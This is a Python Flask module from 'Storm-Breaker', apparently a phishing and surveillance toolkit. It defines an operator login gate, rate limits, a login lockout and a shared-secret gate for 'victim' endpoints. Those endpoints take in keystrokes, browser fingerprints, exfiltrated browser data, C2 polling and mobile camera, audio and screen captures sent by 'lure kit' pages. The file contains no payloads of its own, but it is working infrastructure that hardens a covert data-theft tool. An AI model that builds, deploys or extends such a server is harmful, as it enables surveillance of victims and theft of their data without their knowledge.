"""Storm-Breaker legacy shim — post P3.23.

Every route now lives in ``app/blueprints/*`` (registered by
``app.create_app()``).  This module keeps only the process-global
request gates that operate on the assembled app (victim/public path
exemptions, operator auth gate, persisted login throttle) plus the
direct-run entry point.  Rollback for the P3.23 drain: checkout tag
``g4-ok``.
"""
from __future__ import annotations

import json
import os
import threading
import time as _time

from flask import jsonify, redirect, request, session

import database as db

# === Flask construction delegated to app.create_app() (HANDOFF §P2.4) ===
from app import create_app, _trust_proxy  # P17: lockout hop trust
from app.core import lockout as _lockout  # P7.3: persisted brute-force lockout

app = create_app()

# ===== GLOBAL AUTH GATE (fix for vuln dc999286: unauth read APIs on public URL) =====
_VICTIM_PUBLIC_PATHS = {
    '/login', '/login.php', '/logout', '/logout.php', '/index.php', '/favicon.ico',
    '/receiver', '/receiver.php',
    '/api/fingerprint', '/api/keystrokes',
    '/api/session/start', '/api/session/events', '/api/session/end',
    '/api/c2/register', '/api/c2/poll', '/api/c2/response',
    '/api/c2/file_list_response', '/api/c2/file_download_response',
    '/api/mobile/register', '/api/mobile/poll', '/api/mobile/response',
    '/api/mobile/camera', '/api/mobile/background_data',
    '/api/mobile/screenshot', '/api/mobile/audio', '/api/mobile/screen_record',
    '/api/browser-exfil/receive', '/api/network/receive',
    # P10.2: the desktop shell polls this cookie-less over loopback
    '/api/notify/pending',
}
_VICTIM_PUBLIC_PREFIXES = ('/t/', '/assets/', '/c/')

# P16: Settings.json is resolved next to THIS file, never from the cwd.  The
# reader used to be cwd-relative, so `run_audit.sh` (cd repo-root) and
# `restart_server.bat` (cd storm-web) silently read two DIFFERENT files.
_SETTINGS_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                              'Settings.json')


def _require_login() -> bool:
    """Settings.json ``require_login`` (default True).

    P16: this key was cosmetic -- only panel.html ever looked at it, the gate
    enforced login unconditionally.  Now it actually controls the gate.
    """
    try:
        with open(_SETTINGS_PATH, encoding='utf-8') as fh:
            return bool(json.load(fh).get('require_login', True))
    except Exception:
        return True


# ===== P16: settings read with a 1-stat cache ==============================
_SETTINGS_CACHE = {'mtime': None, 'data': {}}


def _settings_cached() -> dict:
    """Cached Settings.json read (re-reads only when mtime changes)."""
    try:
        mtime = os.path.getmtime(_SETTINGS_PATH)
    except OSError:
        return _SETTINGS_CACHE['data']
    if _SETTINGS_CACHE['mtime'] != mtime:
        try:
            with open(_SETTINGS_PATH, encoding='utf-8') as fh:
                _SETTINGS_CACHE['data'] = json.load(fh)
            _SETTINGS_CACHE['mtime'] = mtime
        except Exception:
            pass
    return _SETTINGS_CACHE['data']


# ===== P16: rate limit (fixed window per IP, no external dependency) =======
_INGEST_RATE_PREFIXES = (
    '/receiver', '/api/fingerprint', '/api/keystrokes', '/api/session/',
    '/api/c2/', '/api/mobile/', '/api/notify/inbox',
    '/api/browser-exfil/receive', '/api/network/receive',
)
_RATE_STATE = {}
_RATE_LOCK = threading.Lock()


@app.before_request
def _rate_gate():
    if request.path.startswith('/assets/'):
        return None
    cfg = _settings_cached()
    ingest = request.path.startswith(_INGEST_RATE_PREFIXES)
    limit = int(cfg.get('ingest_rate_per_min' if ingest else 'rate_limit_per_min',
                       600 if ingest else 1200) or 0)
    if limit <= 0:
        return None
    bucket = (_client_ip(), 'ingest' if ingest else 'general')
    now = _time.time()
    with _RATE_LOCK:
        start, count = _RATE_STATE.get(bucket, (now, 0))
        if now - start >= 60:
            start, count = now, 0
        count += 1
        _RATE_STATE[bucket] = (start, count)
        if len(_RATE_STATE) > 4096:  # prune expired windows
            for k, (s, _c) in list(_RATE_STATE.items()):
                if now - s >= 60:
                    del _RATE_STATE[k]
    if count > limit:
        retry = max(1, int(60 - (now - start)))
        resp = jsonify({'error': 'Rate limit exceeded', 'retry_after': retry})
        resp.status_code = 429
        resp.headers['Retry-After'] = str(retry)
        return resp


# ===== P16: victim-side shared secret (optional) ===========================
# Empty ``ingest_secret`` = off (fully backwards compatible).  When set, victim
# traffic must present it via ?k= / X-Storm-Key / body k / the storm_k cookie.
# A valid ?k= on a page load plants the cookie, so lure kit JS needs no patching.
_INGEST_PATHS = {
    '/receiver', '/receiver.php', '/api/fingerprint', '/api/keystrokes',
    '/api/webrtc_leak', '/api/browser-exfil/receive', '/api/network/receive',
}
_INGEST_PREFIXES = ('/api/session/', '/api/c2/', '/api/mobile/')
_INGEST_COOKIE = 'storm_k'


def _presented_ingest_key() -> str:
    k = (request.args.get('k') or request.headers.get('X-Storm-Key')
         or request.cookies.get(_INGEST_COOKIE) or '')
    if not k and request.is_json:
        try:
            body = request.get_json(silent=True)
            if isinstance(body, dict):
                k = body.get('k') or body.get('key') or ''
        except Exception:
            pass
    return (k or '').strip()


def _ingest_secret() -> str:
    return (_settings_cached().get('ingest_secret') or '').strip()


@app.before_request
def _ingest_key_gate():
    secret = _ingest_secret()
    if not secret:
        return None
    if session.get('IAm-logined'):
        return None                       # panel/operator traffic is exempt
    path = request.path
    if not (path in _INGEST_PATHS or path.startswith(_INGEST_PREFIXES)):
        return None
    if _presented_ingest_key() == secret:
        return None
    return jsonify({'error': 'Invalid or missing ingest key'}), 401


@app.after_request
def _ingest_key_cookie(resp):
    """Plant the cookie when a valid ?k= arrives, so the lure page keeps working."""
    secret = _ingest_secret()
    if secret and (request.args.get('k') or '').strip() == secret \
            and not request.cookies.get(_INGEST_COOKIE):
        resp.set_cookie(_INGEST_COOKIE, secret, max_age=60 * 60 * 24 * 30,
                        samesite='Lax', httponly=True)
    return resp


@app.before_request
def _auth_gate():
    path = request.path
    if path in _VICTIM_PUBLIC_PATHS:
        return None
    if any(path.startswith(p) for p in _VICTIM_PUBLIC_PREFIXES):
        return None
    # P16: the webhook sink takes anonymous POSTs; its GET read stays authed.
    if path == '/api/notify/inbox' and request.method == 'POST':
        return None
    if not _require_login():
        return None
    if session.get('IAm-logined'):
        return None
    if path.startswith('/api/') or path.endswith('.php'):
        return jsonify({'error': 'Unauthorized'}), 401
    return redirect('/login')

def _client_ip() -> str:
    """Spoof-resistant client IP for throttling.

    P17: with ProxyFix enabled it has already collapsed ``X-Forwarded-For`` to
    the LAST hop into ``request.remote_addr`` -- the value the trusted proxy
    appended, not the one the client can freely type.  Reading the *first* XFF
    entry (the old behaviour) let anyone rotate it and never trip the lockout.
    """
    if _trust_proxy():
        return request.remote_addr or '?'
    return (request.headers.get('X-Forwarded-For')
            or request.remote_addr or '?').split(',')[0].strip()


# ===== login brute-force lockout (fix: public URL + default creds) =====
# P7.3: lockout state is persisted in the operator DB (login_lockouts
# table, applied by the additive migration) so it survives restarts.

@app.before_request
def _login_throttle():
    if request.path in ('/login', '/login.php') and request.method == 'POST':
        ip = _client_ip()
        rec = _lockout.get(ip)  # P7.3: persisted
        if rec and rec[1] > _time.time():
            return jsonify({'error': 'Too many failed attempts; locked 60s'}), 429

@app.after_request
def _login_throttle_track(resp):
    if request.path in ('/login', '/login.php') and request.method == 'POST':
        ip = _client_ip()
        if resp.status_code in (301, 302):
            _lockout.pop(ip)
        else:
            fails, until = _lockout.get(ip) or (0, 0)
            if until and until <= _time.time():
                fails = 0
            fails += 1
            _lockout.set(ip, fails, (_time.time() + 60) if fails >= 5 else 0)
    return resp


if __name__ == '__main__':
    # Initialize database
    db.init_database()
    app.run(host='0.0.0.0', port=2525, debug=False)
